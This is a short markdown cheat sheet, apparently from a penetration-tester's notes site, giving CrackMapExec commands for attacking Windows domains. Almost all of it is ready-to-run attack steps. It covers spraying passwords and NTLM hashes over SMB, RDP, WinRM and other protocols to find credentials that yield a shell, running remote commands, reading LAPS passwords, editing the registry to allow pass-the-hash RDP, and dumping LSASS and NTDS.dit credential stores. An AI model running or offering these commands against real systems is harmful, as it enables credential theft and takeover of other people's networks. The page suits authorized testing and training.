---
title: Crackmapexec
parent: General Usage
layout: default
nav_order: 6
---

-x for command to be run, -u and -p both can put wordlist

Crackmapexec in Kali is outdated, but discontinued. Use at own discretion.

Simple general usage using password:\
` ./cme smb IP --kdcHost dc.fulldomain.com -u user -p pass -x ipconfig`

Simple general usage using hashes (local authentication, can remove if no need):\
` ./cme smb IP --kdcHost dc.fulldomain.com -u Administrator -H ee0c207898a5bccc01f38115019ca2fb -x ipconfig --local-auth`

To test whether a set of credential is valid to spawn shell, can use: (green <span style="color:green;">+</span> means correct, red <span style="color:red;">-</span> means wrong, orange <span style="color:orange;">Pwn3d!</span> means can spawn shell) (can replace username and password with listing you created, `--port` if custom port):\
`./cme smb targetIP -u username -p password --continue-on-success`\
(Replace protocols with rdp, ssh, mssql, winrm, smb, ldap to try more)

Get LAPS password (add the kdcFQDN to hosts file if fails):\
`./cme ldap targetIP -u user -p password --kdcHost kdcFQDN -M laps`

To run commands after seeing (Pwned!), append `-x` for normal cmd, or `-X` for powershell. Can use quotes for long commands.

Enable RDP via CME:\
`./cme smb targetIP -u user -H hash --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'`

**Admin Privilege required:**
Immediately dump LSASS password using CME (replace `-d` with `--local-auth` if local account):\
`./cme smb targetIP -u user -H hash -d domain.com -M lsassy`

Dump the NTDS.dit:\
`./cme smb targetIP -d domain.com -u user -H hash --ntds`